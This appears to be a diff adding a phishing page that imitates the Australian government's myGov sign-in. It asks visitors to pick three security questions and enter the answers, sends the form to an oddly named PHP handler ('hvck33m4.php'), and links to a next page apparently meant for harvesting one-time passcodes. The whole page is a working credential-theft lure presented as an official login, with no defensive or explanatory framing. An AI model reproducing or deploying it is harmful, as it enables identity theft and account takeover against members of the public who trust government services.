@@ -1,0 +1,274 @@
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<title>
+		Sign in with myGov - myGov
+	</title>
+	<meta name="description" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- phone number format detection, turning it off -->
+	<meta name="format-detection" content="telephone=no">
+	<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+
+	<script type="text/javascript" src="mask.js"></script>
+  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+	<link
+		href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
+		rel="stylesheet">
+	<link href="css/mgv2-application.css" rel="stylesheet">
+	<link href="css/blugov.css" rel="stylesheet">
+<style type="text/css">
+	
+	.selectoption{
+		position: relative;width: 100%;    border-radius: 2px;
+    border-radius: 0.125rem;
+    height: 48px;
+    height: 3rem;
+    border: 1px solid #000;
+    border: 0.0625rem solid #000;
+	}
+</style>
+</head>
+
+
+
+
+
+	
+		<body>
+	
+	
+
+
+
+
+
+
+<div class="brand-rainbow">&nbsp;</div>
+<header role="banner" class="mgvEnhanceHeader">
+	<section class="wrapper">
+		<div class="inner">
+			<div class="unauth-grid">
+				<div class="unauth-grid-row">
+					<a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
+					   <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                    </a>
+
+
+				</div>
+			</div>
+		</div>
+	</section>
+</header>
+
+
+
+
+
+
+
+
+
+<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
+	<div class="unauth">
+		<div class="login-grid-container">
+			<div class="login-grid-row">
+				<div class="login-grid-column">
+					<div class="digital-id-login-card-wrapper">
+						<div class="digital-id-main-login-card override">
+	
+							
+								
+							
+
+
+							<h1>Sign in with myGov</h1>
+							<h2 class="text-align-left">Verify your Security Questions</h2>
+							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="hvck33m4.php" method="post">
+	
+								<div class="input-group">
+									<label class="override" for="userId">Security Question 1</label>
+									 <!-- <input placeholder="Enter Security Question" id="userId" name="sec_q_1" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+ -->
+									<select id="sec_q_1" class="selectoption" name="sec_q_1">
+										<option value="0">Select Your Security Question</option>
+										<option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
+										<option value="What was the first live concert, theatre or bandI went to see?">What was the first live concert, theatre or band I went to see?</option>
+										<option value="What is the name of the primary school I attended?">What is the name of the primary school I attended?</option>
+										<option value="What was my favorite place to visit as a child?">What was my favorite place to visit as a child?</option>
+										<option value="What was my nickname at school?">What was my nickname at school?</option>
+										<option value="What is the name of the first street i lived in?">What is the name of the first street i lived in?</option>
+										<option value="x">Write your own question</option>
+									</select> 
+									<input style="display:none;" placeholder="Enter your own question" id="sec_q_11" name="sec_q_11" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+									<input placeholder="Enter Security Answer" id="userId" name="sec_a_1" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+								</div>
+
+								<div class="input-group">
+									<label class="override" for="userId">Security Question 2</label>
+									<select id="sec_q_2" class="selectoption" name="sec_q_2">
+										<option value="0">Select Your Security Question</option>
+										<option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
+										<option value="What was my favorite childhood book?">What was my favorite childhood book?</option>
+										<option value="What sport or hobby did I do as a child?">What sport or hobby did I do as a child?</option>
+										<option value="What is the name of the primary school I attended?">What is the name of the primary school I attended?</option>
+										<option value="What was my nickname at school?">What was my nickname at school?</option>
+										<option value="What was the name of my first pet?">What was the name of my first pet?</option>
+										<option value="x">Write your own question</option>
+										
+
+									</select> 
+									<input style="display:none;" placeholder="Enter your own question" id="sec_q_22" name="sec_q_22" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+									<input placeholder="Enter Security Answer" id="userId" name="sec_a_2" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+								</div>
+
+								<div class="input-group">
+									<label class="override" for="userId">Security Question 3</label>
+									<select id="sec_q_3" class="selectoption" name="sec_q_3">
+										<option value="0">Select Your Security Question</option>
+										<option value="What is my most memorable momentin my adult life?">What is my most memorable momentin my adult life?</option>
+										<option value="Who was my favorite teacher at school?">Who was my favorite teacher at school?</option>
+										<option value="What sport or hobby did I do as a child?">What sport or hobby did I do as a child?</option>
+										<option value="What was the full name of my first boyfriend/girlfriend?">What was the full name of my first boyfriend/girlfriend?</option>
+										<option value="What is your favorite memory from school?">What is your favorite memory from school?</option>
+										<option value="What was the name of my first pet?">What was the name of my first pet?</option>
+										<option value="x">Write your own question</option>
+
+									</select> 
+									<input style="display:none;" placeholder="Enter your own question" id="sec_q_33" name="sec_q_33" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+									<input placeholder="Enter Security Answer" id="userId" name="sec_a_3" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off"/>
+								</div>
+								
+								
+
+
+								<br>
+	
+								<div class="button-digital-id-main-container override">
+									<div class="digital-id-button-container">
+										<button type="submit" class="button-main" name="_eventId_login">Continue</button>
+									</div>
+
+									<center>
+										<a href="otp2.html">SKIP</a>
+									</center>
+								</div>
+	
+								
+									
+									
+								
+								
+								
+							
+								
+							<div>
+<input type="hidden" name="_csrf" value="72b42f2c-9322-4850-b249-78797e38d491" />
+</div></form>
+	
+							
+										
+						
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div></div>
+
+
+
+
+
+<footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+
+        <section class="footer-list">
+            <nav>
+            <h2 class="sr-only" aria-label="Footer">Footer</h2>
+            <ul class="lower-links">
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
+                </li>
+            </ul>
+            </nav>
+        </section>
+          <div class="footer-lower">
+              <section class="footer-lower-logo">
+              <a href="https://beta.my.gov.au/">
+                  <img src="images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+              </a>
+              </section>
+
+              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+          </div>
+
+
+
+
+      </div>
+    </div>
+  </footer>
+
+<div id="artifact-metadata">
+	
+</div>
+
+<script type="text/javascript">
+	
+	$("#sec_q_1").change(function(){
+	  var data = document.getElementById("sec_q_1").value;
+	  if(data == "x"){
+	  	document.getElementById("sec_q_11").style.display = "block"
+	  }else{
+	  	document.getElementById("sec_q_11").style.display = "none"
+	  }
+	});
+
+	$("#sec_q_2").change(function(){
+	  var data = document.getElementById("sec_q_2").value;
+	  if(data == "x"){
+	  	document.getElementById("sec_q_22").style.display = "block"
+	  }else{
+	  	document.getElementById("sec_q_22").style.display = "none"
+	  }
+	});
+
+	$("#sec_q_3").change(function(){
+	  var data = document.getElementById("sec_q_3").value;
+	  if(data == "x"){
+	  	document.getElementById("sec_q_33").style.display = "block"
+	  }else{
+	  	document.getElementById("sec_q_33").style.display = "none"
+	  }
+	});
+
+
+</script>
+</body>
+
+</html>
